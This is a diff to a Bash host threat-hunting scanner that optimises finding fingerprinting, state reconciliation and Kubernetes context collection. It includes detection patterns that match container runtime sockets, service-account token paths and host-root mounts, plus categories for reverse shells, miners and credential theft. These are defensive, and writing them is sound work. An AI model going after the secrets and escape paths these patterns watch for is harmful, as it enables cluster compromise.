+        FINDING_ESCALATION_CONDITIONS[$idx]="$escalation_conditions"
+        FINDING_EVIDENCE_DOMAINS[$idx]=$(normalize_evidence_domains "${FINDING_EVIDENCE_DOMAINS[$idx]},${evidence_domains}")
+        FINDING_DOMAIN_COUNTS[$idx]=$(evidence_domain_count "${FINDING_EVIDENCE_DOMAINS[$idx]}")
+        FINDING_COUNTER_EVIDENCE[$idx]="$counter_evidence"
+        FINDING_TIMELINES[$idx]="${FINDING_TIMELINES[$idx]}${FINDING_TIMELINES[$idx]:+$'\n'}${timeline}"
+        [ "${FINDING_TYPES[$idx]}" = "SECURITY_THREAT" ] && requested_finding_type="SECURITY_THREAT"
+        apply_threat_gate "$requested_finding_type" "${FINDING_RULE_IDS[$idx]}" "$confidence" "${FINDING_EVIDENCE_DOMAINS[$idx]}"
+        FINDING_TYPES[$idx]="$THREAT_GATE_TYPE"; FINDING_CONFIDENCES[$idx]="$THREAT_GATE_CONFIDENCE"
+        return 0
+    fi
 
     FINDING_ID=$((FINDING_ID + 1))
     # 结构化保存，避免将未转义的证据拼进 JSON 后再用正则反解析。
@@ -1365,9 +1443,10 @@ record_find() {
     FINDING_RULE_IDS+=("$rule_id")
     FINDING_ENTITY_KEYS+=("$entity_key")
     FINDING_ENTITY_TYPES+=("$(linux_entity_type "$entity_key")")
-    FINDING_FINGERPRINTS+=("$fingerprint")
-    FINDING_EVIDENCE_HASHES+=("$evidence_hash")
-    FINDING_EVIDENCE_PART_HASHES+=("$evidence_hash")
+    FINDING_FINGERPRINTS+=("")
+    FINDING_FP_KEYS+=("$fp_input")
+    FINDING_EVIDENCE_HASHES+=("")
+    FINDING_EVIDENCE_PART_KEYS+=($'\x1f'"${evidence}"$'\x1f')
     FINDING_MODULES+=("${CURRENT_MODULE:-unknown}")
     FINDING_LIFECYCLES+=("UNCLASSIFIED")
     FINDING_FIRST_SEEN+=("$RUN_STARTED_AT")
@@ -1382,6 +1461,7 @@ record_find() {
     FINDING_DOMAIN_COUNTS+=("$domain_count")
     FINDING_COUNTER_EVIDENCE+=("$counter_evidence")
     FINDING_TIMELINES+=("$timeline")
+    FINDING_FP_INDEX["$fp_input"]=$(( ${#FINDINGS[@]} - 1 ))
 }
 
 # 输出一个发现到终端
@@ -1442,11 +1522,11 @@ write_suppression_audit() {
 }
 
 # 检查是否为白名单进程
+# v2.2 快赢：白名单构建期预降小写一次，运行时纯 bash 比较（原先每次调用
+# 2×条目数 次 tr fork，~55 条白名单 = 220 fork/调用）。
 is_whitelisted() {
-    local pname="$1"
-    for w in "${WHITELIST_PROCESS[@]}"; do
-        if [ "$(printf '%s' "$pname" | tr '[:upper:]' '[:lower:]')" = "$(printf '%s' "$w" | tr '[:upper:]' '[:lower:]')" ]; then record_suppression 'ALLOW-PROCESS' "$pname" '进程白名单仅降低弱启发式信号' "$pname" 'process.allow/built-in' '' ''; return 0; fi
-    done
+    local pname="$1" lowered="${WHITELIST_LOWER[$pname]:-}"
+    [ -n "$lowered" ] && { record_suppression 'ALLOW-PROCESS' "$pname" '进程白名单仅降低弱启发式信号' "$pname" 'process.allow/built-in' '' ''; return 0; }
     return 1
 }
 
@@ -1778,7 +1858,13 @@ lifecycle_label() {
 }
 
 module_status_label() {
-    case "$1" in SUCCESS) echo '完成' ;; PARTIAL) echo '部分完成' ;; FAILED) echo '失败' ;; *) echo "$1" ;; esac
+    case "$1" in
+        SUCCESS) echo '完成' ;;
+        PARTIAL) echo '部分完成' ;;
+        FAILED) echo '失败' ;;
+        SKIPPED_BUDGET) echo '已达扫描时限跳过' ;;
+        *) echo "$1" ;;
+    esac
 }
 
 state_health_label() {
@@ -2026,6 +2112,7 @@ native_scanner_preflight() {
     NATIVE_HASH_FILES_READY=false
     NATIVE_FILE_MONITOR_READY=false
     NATIVE_RUNTIME_READY=false
+    NATIVE_PRIORITY_WALK_READY=false
     case "$NATIVE_SCANNER_MODE" in auto|on|off) ;; *) log_error 'SECSCOPE_NATIVE_SCANNER 仅支持 auto、on 或 off'; return 2 ;; esac
     if [ "$NATIVE_SCANNER_MODE" = off ]; then
         NATIVE_SCANNER_STATUS="DISABLED"
@@ -2059,6 +2146,8 @@ native_scanner_preflight() {
             NATIVE_HASH_FILES_READY=true
             NATIVE_FILE_MONITOR_READY=true
             NATIVE_RUNTIME_READY=true
+            # 可选能力：评分遍历子命令存在时跳过 Bash find+stat 候选收集。
+            printf '%s' "$capability" | grep -q 'native_priority_candidates' && NATIVE_PRIORITY_WALK_READY=true
         fi
     fi
     printf '{"schema_version":1,"mode":%s,"status":%s,"path":%s,"engine":"native-required","file_monitor_ready":%s,"runtime_collector_ready":%s}\n' \
@@ -2073,6 +2162,9 @@ native_runtime_run() {
     local summary="${RAW_DIR}/runtime-snapshot-${phase}-summary.json" rc=0 status="FAILED"
     local -a command=("$NATIVE_SCANNER_PATH" runtime-snapshot --output "$raw_path" --phase "$phase"
         --max-processes 32768 --max-sockets 262144 --max-maps 262144)
+    [ -z "$PACKAGE_INDEX_CACHE_FILE" ] || command+=(--package-cache "$PACKAGE_INDEX_CACHE_FILE")
+    # periodic 只服务间隔对比（进程表+socket），fd/map 细节只有 initial/final 消费。
+    [ "$phase" != periodic ] || command+=(--light true)
     [ -n "$process_path" ] && command+=(--process-tsv "$process_path")
     [ -n "$container_path" ] && command+=(--container-tsv "$container_path")
     [ -n "$memory_path" ] && command+=(--memory-tsv "$memory_path")
@@ -2138,8 +2230,12 @@ csv_json_array() {
 }
 
 context_field() {
-    local context="$1" field="$2" value
-    value=$(printf '%s' "$context" | sed -n "s/.*${field}=\([^;]*\).*/\1/p" | head -1)
+    local context="$1" field="$2" value=""
+    # 语义与旧 sed 贪婪匹配一致：取最后一次 "field=" 之后到分号的内容
+    if [[ "$context" == *"${field}="* ]]; then
+        value="${context##*"${field}="}"
+        value="${value%%;*}"
+    fi
     printf '%s' "${value:-none}"
 }
 
@@ -2184,7 +2280,7 @@ replace_html_tokens() {
             @parts = split(/\0/, <STDIN>, -1);
             for ($i=0; $i+1<@parts; $i+=2) { $replacement{$parts[$i]} = $parts[$i+1] }
         }
-        s/(HOSTNAME_PLACEHOLDER|LOCAL_IPS_PLACEHOLDER|OS_PLACEHOLDER|KERNEL_PLACEHOLDER|TS_PLACEHOLDER|HOST_ROLE_PLACEHOLDER|PROFILE_PLACEHOLDER|COVERAGE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|STATE_PLACEHOLDER|AUTH_PROFILE_PLACEHOLDER|CONCLUSION_CLASS|CONCLUSION_TEXT|SCRIPT_VER|THREAT_STATS|THREAT_TABLE|ANOMALY_TABLE|BASELINE_STATS|BASELINE_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|YARA_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE|CHANGE_STATS|CHANGE_TABLE|ENDPOINT_TABLE|PRIORITY_TABLE|MODULE_TABLE|RAW_ROWS|ARCHIVE_ROWS|IOC_DATA_PLACEHOLDER)/$replacement{$1}/ge
+        s/(HOSTNAME_PLACEHOLDER|LOCAL_IPS_PLACEHOLDER|OS_PLACEHOLDER|KERNEL_PLACEHOLDER|TS_PLACEHOLDER|HOST_ROLE_PLACEHOLDER|PROFILE_PLACEHOLDER|COVERAGE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|STATE_PLACEHOLDER|AUTH_PROFILE_PLACEHOLDER|CONCLUSION_CLASS|CONCLUSION_TEXT|SCRIPT_VER|THREAT_STATS|THREAT_TABLE|ANOMALY_TABLE|BASELINE_STATS|BASELINE_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE|CHANGE_STATS|CHANGE_TABLE|ENDPOINT_TABLE|PRIORITY_TABLE|MODULE_TABLE|RAW_ROWS|ARCHIVE_ROWS|IOC_DATA_PLACEHOLDER)/$replacement{$1}/ge
     ' "$html_file"
 }
 
@@ -2260,13 +2356,25 @@ module_source_plan() {
         network) echo "socket-snapshot,routing,dns,process-socket-map,beacon-history" ;;
         rootkit) echo "kernel-modules,procfs-cross-check,ld-preload,package-integrity,ima" ;;
         persistence) echo "cron,systemd,ssh-keys,shell-profiles,loader-config" ;;
-        filesystem) echo "bounded-file-snapshot,file-hashes,file-type,package-owner,yara" ;;
+        filesystem) echo "bounded-file-snapshot,file-hashes,file-type,package-owner" ;;
         history) echo "shell-history,environment,temp-artifacts" ;;
         services) echo "systemd-services,package-inventory,patch-posture,web-runtime-baseline" ;;
         logs) echo "auth-log,auditd,journald-audit,falco,system-log,web-access-log" ;;
         memory) echo "proc-maps,memfd,rwx-mappings,ptrace-events,memory-pressure" ;;
         baseline) echo "ssh-policy,password-policy,mac-policy,firewall,time-sync" ;;
+        correlation) echo "web-access-log,file-changes,runtime-events,threat-intel" ;;
     esac
+}
+
+# v2 关联模块：把原本未接线的跨模块关联引擎（Web 攻击链、Beacon 周期、
+# 高级行为、RAT 证据图 + 本地威胁情报）并入主流程。
+run_correlation_module() {
+    correlate_web_attack_chain || mark_current_module_partial web_attack_chain_failed
+    # v2.3（审计 R1）：analyze_beacon_events 由 correlate_advanced_behaviors
+    # 内部调用，此处不再重复执行——此前每轮 beacon 分析双跑且
+    # NET-BEACON-CANDIDATE finding 以两个指纹重复上报。
+    correlate_advanced_behaviors || true
+    run_rat_detection_engine
 }
 
 module_source_runtime_status() {
@@ -2275,7 +2383,6 @@ module_source_runtime_status() {
         socket-snapshot) case "$SOCKET_SNAPSHOT_STATUS" in AVAILABLE|PARTIAL) echo SUCCESS ;; *) echo UNAVAILABLE ;; esac ;;
         audit-auth|auditd) [ "$EVENT_SOURCE_AUDITD" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
         falco) [ "$EVENT_SOURCE_FALCO" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
-        yara) [ "$EVENT_SOURCE_YARA" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
         ima) [ "$EVENT_SOURCE_IMA" = AVAILABLE ] && echo SUCCESS || echo UNAVAILABLE ;;
         web-access-log) case "$WEB_ACCESS_LOG_STATUS" in AVAILABLE|PARTIAL) echo SUCCESS ;; *) echo UNAVAILABLE ;; esac ;;
         beacon-history) [ "$STATE_ENABLED" = true ] && echo SUCCESS || echo UNAVAILABLE ;;
@@ -2306,6 +2413,32 @@ run_module() {
     local module_id="$1" module_name="$2" fn="$3"
     local start end rc=0 status="SUCCESS" missing="" cmd raw_log progress_detail planned successful="" no_result="" unavailable="" failed="" source coverage=0 source_total=0 source_success=0 source_state
     local saved_red="$RED" saved_green="$GREEN" saved_yellow="$YELLOW" saved_blue="$BLUE" saved_magenta="$MAGENTA" saved_cyan="$CYAN" saved_bold="$BOLD" saved_dim="$DIM" saved_nc="$NC"
+    # 全局 15 分钟预算：剩余时间不足以安全启动下一个模块时，跳过并把该模块
+    # 记为 SKIPPED_BUDGET（按 PARTIAL 呈现），保证扫描窗口可预测。
+    local now_epoch elapsed remaining
+    now_epoch=$(date +%s)
+    elapsed=$((now_epoch - RUN_STARTED_EPOCH))
+    remaining=$((SCAN_DEADLINE_SECONDS - elapsed))
+    if [ "$remaining" -lt "$DEADLINE_RESERVE_SECONDS" ]; then
+        MODULE_IDS+=("$module_id")
+        MODULE_NAMES+=("$module_name")
+        MODULE_STATUSES+=("SKIPPED_BUDGET")
+        MODULE_DURATIONS+=("0")
+        MODULE_ERRORS+=("skipped:global_scan_budget_exhausted remaining=${remaining}s elapsed=${elapsed}s")
+        MODULE_PLANNED_SOURCES+=("")
+        MODULE_SUCCESSFUL_SOURCES+=("")
+        MODULE_NO_RESULT_SOURCES+=("")
+        MODULE_UNAVAILABLE_SOURCES+=("")
+        MODULE_FAILED_SOURCES+=("")
+        MODULE_MISSING_SOURCES+=("")
+        MODULE_COVERAGES+=("0")
+        MODULE_COMPLETED=$((MODULE_COMPLETED + 1))
+        record_raw_status "module-${module_id}" PARTIAL patterns "global_scan_budget_exhausted"
+        mark_current_module_partial "module_${module_id}_skipped_budget"
+        progress_bar "$MODULE_COMPLETED" "$MODULE_TOTAL" "$module_name" PARTIAL "已达扫描时限，跳过"
+        CURRENT_MODULE="bootstrap"
+        return 0
+    fi
     start=$(date +%s)
     CURRENT_MODULE="$module_id"
     write_stage_checkpoint "$module_id" RUNNING "module_started" || true
@@ -2503,6 +2636,132 @@ increment_lifecycle_count() {
     esac
 }
 
+# 轮末批量计算全部 Finding 的指纹/证据哈希/规则 ID/状态行 base64。
+# 输入契约与旧版 record_find 内逐条计算完全一致：
+#   fingerprint = sha256("<rule_id>|<entity_key>")，自动规则时 rule_id =
+#   <前缀> + sha256("<category>|<normalized>") 前 12 位；
+#   evidence_hash = sha256(evidence 经 PID/时间戳归一化后的文本)。
+# 唯一已知差异：无效 UTF-8 字节在 Python 侧被替换解码，跨轮 CHANGED 判定
+# 可能因此一次性误报，随后恢复一致。
+finalize_finding_hashes() {
+    local count="${#FINDINGS[@]}" idx
+    [ "$count" -gt 0 ] || return 0
+
+    finalize_finding_hashes_fallback() {
+        local idx rest rule_id entity category tail normalized
+        for idx in "${!FINDINGS[@]}"; do
+            if [ -z "${FINDING_RULE_IDS[$idx]}" ]; then
+                rest="${FINDING_FP_KEYS[$idx]#A|}"
+                category="${rest%%|*}"
+                tail="${rest#*|}"
+                normalized="${tail%|*}"
+                FINDING_RULE_IDS[$idx]=$(auto_rule_id "$category" "$normalized")
+                rule_id="${FINDING_RULE_IDS[$idx]}"
+            else
+                rule_id="${FINDING_RULE_IDS[$idx]}"
+            fi
+            entity="${FINDING_ENTITY_KEYS[$idx]}"
+            FINDING_FINGERPRINTS[$idx]=$(sha256_text "${rule_id}|${entity}")
+            FINDING_EVIDENCE_HASHES[$idx]=$(evidence_identity_hash "${FINDING_EVIDENCES[$idx]}")
+            FINDING_B64_SUMMARIES[$idx]=$(base64_one_line "${FINDING_SUMMARIES[$idx]}")
+            FINDING_B64_ENTITIES[$idx]=$(base64_one_line "${entity}")
+        done
+    }
+
+    if ! command -v python3 >/dev/null 2>&1; then
+        finalize_finding_hashes_fallback
+        return 0
+    fi
+
+    local workdir fp_in ev_in sum_in ent_in out rec j=0
+    # one-shot（--no-state）模式不准备 STATE_DIR；临时目录回退到 OUTPUT_DIR。
+    local batch_tmp_root="${STATE_DIR:-${TMPDIR:-/tmp}}"
+    [ "$STATE_ENABLED" = true ] || batch_tmp_root="${OUTPUT_DIR:-${TMPDIR:-/tmp}}"
+    mkdir -p "$batch_tmp_root" 2>/dev/null || true
+    workdir=$(mktemp -d "${batch_tmp_root}/.finding-batch.XXXXXX") || {
+        finalize_finding_hashes_fallback
+        return 0
+    }
+    fp_in="$workdir/fp"; ev_in="$workdir/ev"; sum_in="$workdir/sum"; ent_in="$workdir/ent"; out="$workdir/out"
+    : > "$fp_in"; : > "$ev_in"; : > "$sum_in"; : > "$ent_in"; : > "$out"
+    for idx in "${!FINDINGS[@]}"; do
+        printf '%s\0' "${FINDING_FP_KEYS[$idx]}" >> "$fp_in"
+        printf '%s\0' "${FINDING_EVIDENCES[$idx]}" >> "$ev_in"
+        printf '%s\0' "${FINDING_SUMMARIES[$idx]}" >> "$sum_in"
+        printf '%s\0' "${FINDING_ENTITY_KEYS[$idx]}" >> "$ent_in"
+    done
+    if python3 - "$fp_in" "$ev_in" "$sum_in" "$ent_in" "$out" <<'PYEOF' 2>/dev/null
+import base64, hashlib, re, sys
+
+def read_records(path):
+    data = open(path, 'rb').read()
+    if data.endswith(b'\0'):
+        data = data[:-1]
+    return data.split(b'\0') if data else []
+
+def canonical_evidence(s):
+    s = re.sub(r'(?i)pid[=:\s]*\d+', 'PID', s)
+    s = re.sub(r'pid=\d+', 'pid=PID', s)
+    s = re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:Z|\.\d+|[+-][\d:]+)?', '<TIME>', s)
+    return re.sub(r'\s+', ' ', s).strip()
+
+AUTO_PREFIX = {
+    'users': 'USR', 'process': 'PRS', 'network': 'NET', 'rootkit': 'INT',
+    'kernel': 'INT', 'injection': 'INT', 'persistence': 'PER', 'filesystem': 'FS',
+    'history': 'HIS', 'logs': 'LOG', 'attack_chain': 'LOG', 'webshell': 'WEB',
+    'miner': 'MIN', 'reversesh': 'REV', 'reverseshell': 'REV', 'credential': 'SEC',
+    'backdoor': 'SEC', 'baseline': 'BAS', 'config': 'BAS', 'supplychain': 'SUP',
+}
+
+def b64(s):
+    return base64.b64encode(s.encode('utf-8', 'replace')).decode('ascii')
+
+def sha(s):
+    return hashlib.sha256(s.encode('utf-8', 'replace')).hexdigest()
+
+fp_rows = read_records(sys.argv[1])
+ev_rows = read_records(sys.argv[2])
+sum_rows = read_records(sys.argv[3])
+ent_rows = read_records(sys.argv[4])
+n = len(fp_rows)
+if not (len(ev_rows) == n == len(sum_rows) == len(ent_rows)):
+    sys.exit(2)
+with open(sys.argv[5], 'wb') as w:
+    for i in range(n):
+        kind, _, rest = fp_rows[i].partition('|')
+        if kind == 'R':
+            rule_id, _, entity = rest.partition('|')
+        else:
+            category, _, tail = rest.partition('|')
+            normalized, _, entity = tail.rpartition('|')
+            prefix = AUTO_PREFIX.get(category, 'GEN')
+            rule_id = prefix + '-' + sha(category + '|' + normalized)[:12]
+        fp = sha(rule_id + '|' + entity)
+        evh = sha(canonical_evidence(ev_rows[i].decode('utf-8', 'replace')))
+        w.write(('\x1f'.join((fp, rule_id, evh, b64(sum_rows[i].decode('utf-8', 'replace')),
+                              b64(ent_rows[i].decode('utf-8', 'replace')))) + '\0').encode('ascii'))
+PYEOF
+    then
+        while IFS= read -r -d $'\0' rec; do
+            IFS=$'\x1f' read -r fp rule_id evh b64s b64e <<< "$rec"
+            FINDING_FINGERPRINTS[$j]="$fp"
+            FINDING_RULE_IDS[$j]="$rule_id"
+            FINDING_EVIDENCE_HASHES[$j]="$evh"
+            FINDING_B64_SUMMARIES[$j]="$b64s"
+            FINDING_B64_ENTITIES[$j]="$b64e"
+            j=$((j + 1))
+        done < "$out"
+        if [ "$j" -eq "$count" ]; then
+            rm -rf "$workdir"
+            return 0
+        fi
+        log_warn "finding 批量哈希数量不一致(${j}/${count})，回退逐条计算"
+    fi
+    rm -rf "$workdir"
+    finalize_finding_hashes_fallback
+    return 0
+}
+
 reconcile_state() {
     recalculate_severity_counts
     LIFECYCLE_NEW=0; LIFECYCLE_CHANGED=0; LIFECYCLE_ESCALATED=0; LIFECYCLE_DEESCALATED=0
@@ -2513,10 +2772,20 @@ reconcile_state() {
         return 0
     }
 
-    local previous_exists=false next_file current_file idx prior lifecycle
+    local previous_exists=false next_file idx prior lifecycle
     [ -s "$STATE_FILE" ] && previous_exists=true
     next_file=$(mktemp "${STATE_DIR}/.active.next.XXXXXX") || return 1
-    current_file=$(mktemp "${STATE_DIR}/.current.XXXXXX") || return 1
+    # 上一轮状态整文件载入内存索引；本轮指纹集合用关联数组跟踪，
+    # 消除旧实现里每条 finding 一次 awk / grep 的 fork 开销。
+    declare -A STATE_PRIOR_ROWS=() CURRENT_FPS=()
+    if [ "$previous_exists" = true ]; then
+        local prior_line prior_fp
+        while IFS= read -r prior_line; do
+            [[ "$prior_line" == \#* || -z "$prior_line" ]] && continue
+            prior_fp="${prior_line%%|*}"
+            [ -n "$prior_fp" ] && STATE_PRIOR_ROWS["$prior_fp"]="$prior_line"
+        done < "$STATE_FILE"
+    fi
     state_header > "$next_file"
     printf '\n' >> "$next_file"
 
@@ -2526,7 +2795,7 @@ reconcile_state() {
         local evidence_hash="${FINDING_EVIDENCE_HASHES[$idx]}" summary="${FINDING_SUMMARIES[$idx]}"
         local entity="${FINDING_ENTITY_KEYS[$idx]}" first_seen="$RUN_STARTED_AT" occurrences=1
         prior=""
-        [ "$previous_exists" = true ] && prior=$(awk -F'|' -v fp="$fp" '$1==fp {print; exit}' "$STATE_FILE")
+        [ "$previous_exists" = true ] && prior="${STATE_PRIOR_ROWS[$fp]:-}"
         if [ -z "$prior" ]; then
             if [ "$INIT_STATE" = true ]; then lifecycle="BASELINE_EXISTING"; else lifecycle="NEW"; fi
         else
@@ -2550,17 +2819,17 @@ reconcile_state() {
         FINDING_LAST_SEEN[$idx]="$RUN_STARTED_AT"
         FINDING_OCCURRENCES[$idx]="$occurrences"
         increment_lifecycle_count "$lifecycle"
-        printf '%s\n' "$fp" >> "$current_file"
+        [ -n "$fp" ] && CURRENT_FPS["$fp"]=1
         printf '%s|%s|%s|%s|%s|%s|%s|%s|0|%s|%s|%s|%s\n' \
             "$fp" "$rule_id" "$module" "$category" "$sev" "$first_seen" "$RUN_STARTED_AT" "$occurrences" \
-            "$evidence_hash" "$lifecycle" "$(base64_one_line "$summary")" "$(base64_one_line "$entity")" >> "$next_file"
+            "$evidence_hash" "$lifecycle" "${FINDING_B64_SUMMARIES[$idx]:-$(base64_one_line "$summary")}" "${FINDING_B64_ENTITIES[$idx]:-$(base64_one_line "$entity")}" >> "$next_file"
         [ "$lifecycle" != "ONGOING" ] && append_state_event "$lifecycle" "$fp" "$rule_id" "$sev" "$summary"
     done
 
     if [ "$previous_exists" = true ]; then
         while IFS='|' read -r p_fp p_rule p_module p_cat p_sev p_first p_last p_count p_missing p_ehash p_status p_summary p_entity; do
             [[ "$p_fp" == \#* || -z "$p_fp" ]] && continue
-            grep -qxF "$p_fp" "$current_file" && continue
+            [ -n "${CURRENT_FPS[${p_fp}]:-}" ] && continue
             local missing="$p_missing" status="$p_status" decoded_summary
             if modules_successful "$p_module"; then
                 missing=$((missing + 1))
@@ -2586,7 +2855,6 @@ reconcile_state() {
     STATE_COMMIT_PENDING="${STATE_DIR}/.active.pending.${RUN_ID}"
     mv "$next_file" "$STATE_COMMIT_PENDING"
     chmod 600 "$STATE_COMMIT_PENDING"
-    rm -f "$current_file"
     [ "$STATE_HEALTH" = "NEW" ] && STATE_HEALTH="INITIALIZED"
     return 0
 }
@@ -2720,12 +2988,40 @@ detect_os() {
             AUTH_LOG="/var/log/messages"
             SYSLOG="/var/log/messages"
             ;;
-        *)
-            PKG_MGR="unknown"
+        alpine)
+            # musl/busybox 平台：无 dpkg/rpm，用 apk；认证日志并入 syslog。
+            PKG_MGR="apk"
+            AUTH_LOG="/var/log/auth.log"
+            SYSLOG="/var/log/messages"
+            ;;
+        arch|manjaro|endeavouros|artix)
+            PKG_MGR="pacman"
             AUTH_LOG="/var/log/auth.log"
             SYSLOG="/var/log/syslog"
             ;;
+        gentoo)
+            PKG_MGR="portage"
+            AUTH_LOG="/var/log/auth.log"
+            SYSLOG="/var/log/messages"
+            ;;
+        *)
+            PKG_MGR="unknown"
+            # 无 os-release 的精简镜像按 init 系统与日志文件存在性兜底探测。
+            if [ -f /var/log/secure ]; then
+                AUTH_LOG="/var/log/secure"; SYSLOG="/var/log/messages"
+            else
+                AUTH_LOG="/var/log/auth.log"; SYSLOG="/var/log/syslog"
+            fi
+            ;;
     esac
+    # busybox stat/find 语义差异探测：供哈希与清单代码选择兼容参数。
+    if [ -z "${BUSYBOX_ENV:-}" ]; then
+        if [ -n "$(ls -d /bin/busybox 2>/dev/null)" ] && /bin/busybox --list 2>/dev/null | grep -qx stat; then
+            BUSYBOX_ENV=true
+        else
+            BUSYBOX_ENV=false
+        fi
+    fi
 }
 
 #==============================================================================
@@ -2739,7 +3035,7 @@ print_secscope_logo() {
     if [ "$cols" -lt 62 ]; then
         printf '%bSECSCOPE%b v%s\n' "$BOLD$CYAN" "$NC" "$DISPLAY_VERSION"
         printf '%b  Host inspection / threat hunting%b\n' "$DIM" "$NC"
-        printf '  %s | YARA:%s\n' "$SCAN_PROFILE" "${YARA_MODE:-auto}"
+        printf '  %s\n' "$SCAN_PROFILE"
         printf '  READ-ONLY / OFFLINE\n\n'
     else
         printf '%b%s%b\n' "$BOLD$CYAN" '     _____ _____ _____   _____ _____ _____ _____ _____' "$NC"
@@ -2747,8 +3043,8 @@ print_secscope_logo() {
         printf '%b%s%b\n' "$BOLD$CYAN" '    |__   |   __|   --| |__   |   --|  |  |   __|   __|' "$NC"
         printf '%b%s%b\n' "$BOLD$CYAN" '    |_____|_____|_____| |_____|_____|_____|__|  |_____|' "$NC"
         printf '%b%s%b\n' "$DIM" '                                          v1.1.0' "$NC"
-        printf '    PROFILE:%s  YARA:%s  READ-ONLY / OFFLINE\n\n' \
-            "$SCAN_PROFILE" "${YARA_MODE:-auto}"
+        printf '    PROFILE:%s  READ-ONLY / OFFLINE\n\n' \
+            "$SCAN_PROFILE"
     fi
 }
 
@@ -3170,6 +3466,27 @@ collect_kubernetes_context() {
     local applicable=false
     declare -A unix_socket_paths=()
     while IFS=$'\t' read -r inode unix_path; do [ -n "$inode$unix_path" ] && unix_socket_paths["$inode"]="$unix_path"; done < <(awk 'NR>1 && NF>=8 {print $7 "\t" $8}' /proc/net/unix 2>/dev/null)
+    # 索引预载：旧实现每个 pid fork 2 次 awk 查 process/container-context.tsv，
+    # 外加每 pid 一次 socket_snapshot；全部改为一次性载入内存。
+    declare -A PID_INSTANCE=() PID_HOST_OVERLAP=()
+    local idx_line idx_rest idx_pid
+    if [ -s "${RAW_DIR}/process-context.tsv" ]; then
+        while IFS= read -r idx_line; do
+            [ -n "$idx_line" ] || continue
+            idx_rest="${idx_line#*$'\t'}"; idx_rest="${idx_rest#*$'\t'}"; idx_pid="${idx_rest%%$'\t'*}"
+            [[ "$idx_pid" =~ ^[0-9]+$ ]] && PID_INSTANCE["$idx_pid"]="$(get_tsv_col "$idx_line" 1)"
+        done < "${RAW_DIR}/process-context.tsv"
+    fi
+    if [ -s "${RAW_DIR}/container-context.tsv" ]; then
+        while IFS= read -r idx_line; do
+            [ -n "$idx_line" ] || continue
+            idx_pid="$(get_tsv_col "$idx_line" 1)"
+            [[ "$idx_pid" =~ ^[0-9]+$ ]] && PID_HOST_OVERLAP["$idx_pid"]="$(get_tsv_col "$idx_line" 9)"
+        done < "${RAW_DIR}/container-context.tsv"
+    fi
+    local -a ESTABLISHED_LINES=()
+    local est_line
+    while IFS= read -r est_line; do [ -n "$est_line" ] && ESTABLISHED_LINES+=("$est_line"); done < <(socket_snapshot established 2>/dev/null)
     printf 'process_instance_id\tpid\tcomm\tcontainer_runtime\tevidence_types\tcommand_line\topen_file_or_mount_evidence\tnetwork_context\tcounter_evidence\tassessment\n' > "$out"
     [ "$CONTAINER_CONTEXT_COUNT" -gt 0 ] && applicable=true
     [ "$HOST_ROLE" = kubernetes ] && applicable=true
@@ -3181,11 +3498,16 @@ collect_kubernetes_context() {
         return 0
     fi
     KUBERNETES_CONTEXT_COUNT=0; KUBERNETES_ANOMALY_COUNT=0
+    # 逐 pid 采集进 TSV；告警按 (comm, clues) 聚合，避免 K8S 节点上
+    # 同一工作负载几十个 worker 进程产生几十条重复 Finding。
+    local -a K8S_PIDS=() K8S_COMM=() K8S_RUNTIME=() K8S_CLUES=() K8S_CMD=() K8S_EV=() K8S_DOMAINS=() K8S_TYPE=() K8S_GROUP_ORDER=()
+    declare -A K8S_GROUP_SEEN=() K8S_GROUP_MEMBERS=()
+    local group_key
     for pid_dir in /proc/[0-9]*; do
         pid="${pid_dir#/proc/}"; [ -r "$pid_dir/status" ] || continue
-        comm=$(cat "$pid_dir/comm" 2>/dev/null); cmd=$(tr '\0\t\n' '   ' < "$pid_dir/cmdline" 2>/dev/null | head -c 1000)
+        comm=$(< "$pid_dir/comm" 2>/dev/null); cmd=$(tr '\0\t\n' '   ' < "$pid_dir/cmdline" 2>/dev/null | head -c 1000)
         cgroup=$(awk -F: '{printf "%s%s",sep,$3;sep=","}' "$pid_dir/cgroup" 2>/dev/null); runtime=$(container_runtime_from_cgroup "$cgroup")
-        instance=$(awk -F '\t' -v p="$pid" 'NR>1 && $3==p {print $1;exit}' "${RAW_DIR}/process-context.tsv" 2>/dev/null)
+        instance="${PID_INSTANCE[$pid]:-}"
         fds=$(for link in "$pid_dir"/fd/*; do
             target=$(readlink "$link" 2>/dev/null) || continue
             if [[ "$target" == socket:* ]]; then
@@ -3198,7 +3520,7 @@ collect_kubernetes_context() {
         done | grep -E '/var/run/docker[.]sock|/run/containerd/containerd[.]sock|/var/run/crio/crio[.]sock|/var/run/secrets/kubernetes[.]io/serviceaccount/token|^/host(/|$)|^/proc/1/root(/|$)|^/var/lib/kubelet(/|$)|^/etc/kubernetes(/|$)' | head -20)
         mounts=$(grep -E ' /host(/|[[:space:]])| /proc/1/root(/|[[:space:]])| /var/lib/kubelet(/|[[:space:]])| /etc/kubernetes(/|[[:space:]])' "$pid_dir/mountinfo" 2>/dev/null | head -10)
         cap=$(awk '/^CapEff:/ {print $2;exit}' "$pid_dir/status" 2>/dev/null)
-        host_overlap=$(awk -F '\t' -v p="$pid" 'NR>1 && $1==p {print $9;exit}' "${RAW_DIR}/container-context.tsv" 2>/dev/null)
+        host_overlap="${PID_HOST_OVERLAP[$pid]:-}"
         clues=""
         printf '%s\n%s' "$cmd" "$fds" | grep -qE '/var/run/docker[.]sock|/run/containerd/containerd[.]sock|/var/run/crio/crio[.]sock' && clues="runtime_socket"
         printf '%s\n%s' "$cmd" "$fds" | grep -qF '/var/run/secrets/kubernetes.io/serviceaccount/token' && clues="${clues}${clues:+,}serviceaccount_token"
@@ -3209,22 +3531,62 @@ collect_kubernetes_context() {
         [ -n "$clues" ] || continue
         counter="none"
